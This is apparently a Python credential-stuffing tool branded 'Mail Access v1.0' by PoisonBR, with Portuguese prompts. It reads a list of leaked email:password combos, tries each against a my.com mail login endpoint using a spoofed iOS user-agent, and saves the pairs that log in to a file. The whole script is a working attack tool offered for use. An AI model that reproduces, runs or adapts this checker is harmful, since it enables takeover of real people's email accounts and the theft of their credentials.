import requests, time, os

R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
EG=f'{C}[{G}!{C}]'; MG=f'{C}[{G}+{C}]'; MR=f'{C}[{R}-{C}]'; AG=f'{C}[{G}*{C}]'; IB=f'{C}[{B}i{C}]'; EB=f'{C}[{B}!{C}]'; EY=f'{C}[{Y}!{C}]'; IY=f'{C}[{Y}i{C}]'

os.system('git pull && clear')

print(f'''{C}
                            /+osyhhhhhhyys++/
                         +oydddhhhhyyhhhhdddhy+/
                      /+yddhyyyys.josue.syyhddhs/
                     +hddyyssssssssssssssssssyyhdds/
                   /sddhyyyyyyssssssssssssssyyyyyhmh+
                  /hmdhhddddddhhhyyyyyyhhhhdddddhhhddo
                 /hmmdhs+/ //+osyhhhhhhysso+////ohddmdo
                /hmmmy{B}.           `````          `{C}smddd+
                smddm/{B}     `````          `````   {C}mdhmh/
               +ddydm+{B}  -/osyyyys+.    ./syyyyso/-{C}mdydms
               ymhyhmh{B}.yyo/ -- +hdo  /dho -- /oyh.{C}ymdyymd/
              /dmyyymd{B}.  ``.-   ./   -/.-   .``  `{C}dmhsydmo
              smdysymd{B}   shdhyydy      sdyyhddy   {C}dmyyshmy
              dmysshmy{B}                            {C}smhssymd/
             /dmyssymd{B}                            {C}hmhsyymm/
             /dmyssyhms{B}                          /{C}mdysyymm/
             /dmyssyydm/{B}  sh       hh/     -hy  .{C}dmyssyymm/
              dmhssssydd/{B} -hdhysshdysdhssyhdd  -{C}hmhyssyymd/
              ymhssssyyddo{B}``. //+/.` ./+// -` /{C}ddhysssyhmh
              +mdysssssyhdh{B} `     `/+`      -{C}sddysssssydmo
               ymhysssssyyddh/{B}`   `dm.   ` {C}sddhysssssyhmh/
               /hmhysssssyyyhdds{B} ..dm . {C}ohddhyyssssyyhmd+
                /yddhyssssssyyhhddhddddddhyyssssssyydmh+
               /+sdmmdhhyyyysssyyyyyyyyyysssyyyyyhddmdyo+/
           /+shdddhhyhhddddddhhhhhhhhhhhhhhdddddddhyyhhdddyo/
         /shddhyyysssssyyyyhhhhhhhhhhhhhhhhhhyyyyyssssyyyhdddy+
        /hmhyyssssssssssssssssssssssssssssssssssssssssssssyyhddo
        /dmhyyyyyssssssssssssssssssssssssssssssssssssssyyyyyydms
         +yhddddddhhhhhyyyyyyyyyyyyyyyyyyyyyyyyyyhhhhhdddddddhs/
           //++oossyyhhhhhhhdddddddddddddddddhhhhhhyyssoo++///
                       ///////+++++++++++++//////
     ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██████╗ ██████╗
     ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██╔══██╗██╔══██╗
     ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██████╔╝██████╔╝
     ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██╔══██╗██╔══██╗
     ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██████╔╝██║  ██║
     ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
     {RT}{B}*t.me/p0isonBR*{RT}'''); time.sleep(3)

os.system('clear')

print(f'''{G}*By PoisonBR                                                 
{B}███╗   ███╗ █████╗ ██╗██╗     {C} █████╗  ██████╗ ██████╗███████╗███████╗███████╗
{B}████╗ ████║██╔══██╗██║██║     {C}██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
{B}██╔████╔██║███████║██║██║     {C}███████║██║     ██║     █████╗  ███████╗███████╗
{B}██║╚██╔╝██║██╔══██║██║██║{G}v1.0{C} ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
{B}██║ ╚═╝ ██║██║  ██║██║███████╗{C}██║  ██║╚██████╗╚██████╗███████╗███████║███████║
{B}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝{C}╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
{IY} Não funcional em grandes dominios (ex gmail), por fatores de segurança adicional.
''')

db=open(input(f'{MG} Indique o caminho do arquivo: {B}'), 'r').read().splitlines()
print(IB+' '+G+str(len(db))+C+' e-mails no arquivo.'); time.sleep(3)
print()
txt=input(f'{MG} Defina o nome do novo arquivo de saida:{B} ')
print()
print(f'''{AG} Testando credenciais, aguarde...
''')
ldb=len(db)

def checker(email, senha, c, ldb, txt):
    acesso=requests.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+email+'&Password='+senha, headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
    if ('Ok=1') in acesso:
        print(f'{EG}{G}Credenciais válidas: {C}'+combo)
        print(f'{IB}E-mails verificados: {G}'+str(c)+C+', e-mails restantes: '+G+str(ldb-c)+C)
        with open(txt+'.txt', 'a+') as chk:
          chk.seek(0)
          line=chk.read(150)
          if len(line) > 0:
            chk.write("\n")
          chk.write(email+':'+senha)
        print()
        
c=0        
for combo in db:
  if (':') in combo:
    email=combo.split(':')[0]
    senha=combo.split(':')[1]
    c=c+1
    checker(email, senha, c, ldb, txt)
  elif ('|') in combo:
    email=combo.split('|')[0]
    senha=combo.split('|')[1]
    c=c+1
    checker(email, senha, c, ldb, txt)
  else:
    print(f'{MR}Combo inválido: '+R+combo+C)
v=len(open(txt+'.txt', 'r').read().splitlines())
print(f'{IB} Operação finalizada: '+B+str(ldb)+C+' e-mails verificados. '+G+str(v)+C+' credenciais válidas.')
print()
print(f'{MG} Arquivo salvo em: '+B+txt+'.txt'); time.sleep(2)
print()
print(f'''{EG} Me acompanhe no Github: {G}https://github.com/p0isonBR
{C}''')
